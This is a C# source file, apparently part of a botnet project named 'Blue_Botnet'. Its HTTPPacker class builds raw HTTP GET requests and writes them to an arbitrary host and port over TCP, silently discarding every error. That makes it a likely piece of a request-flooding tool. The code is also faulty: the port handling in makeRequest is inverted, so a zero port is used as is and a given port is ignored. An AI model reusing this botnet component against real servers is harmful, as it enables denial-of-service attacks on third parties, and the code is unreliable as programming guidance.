using System;
using System.Net.Sockets;
using System.Text;

namespace Blue_Botnet
{
	internal class HTTPPacker
	{
		private string msgUrl = "http://127.0.0.1/";

		private string msgHost = "127.0.0.1";

		public string lastMessage = "";

		public string currentHost = "127.0.0.1";

		public int currentPort = 80;

		public void sendRequest(HTTPRequest request)
		{
			TcpClient tcpClient = new TcpClient();
			NetworkStream networkStream = null;
			try
			{
				try
				{
					tcpClient.Connect(currentHost, currentPort);
				}
				catch
				{
				}
				networkStream = tcpClient.GetStream();
				byte[] bytes = Encoding.ASCII.GetBytes(request.RequestStr);
				networkStream.Write(bytes, 0, bytes.Length);
			}
			catch
			{
			}
		}

		public void makeRequest(string nHost, int nPort = 0, HTTPRequest req = null)
		{
			currentHost = cleanUrl(nHost);
			if (nPort != 0)
			{
				currentPort = cleanPort(nHost);
			}
			else
			{
				currentPort = nPort;
			}
			msgHost = currentHost;
			msgUrl = nHost;
			if (req == null)
			{
				req = new HTTPRequest();
				req.SetUrl(msgUrl);
				req.SetHost(currentHost);
				req.BuildGETRequest();
			}
			sendRequest(req);
		}

		public string cleanUrl(string url)
		{
			return url.Replace("http://", "").Replace("https://", "").Split('/')[0].Split(':')[0];
		}

		public int cleanPort(string url)
		{
			if (url.Replace("http://", "").Replace("https://", "").Split('/')[0].Split(':').Length > 1)
			{
				return Convert.ToInt32(url.Replace("http://", "").Replace("https://", "").Split('/')[0].Split(':')[1]);
			}
			return 80;
		}
	}
}
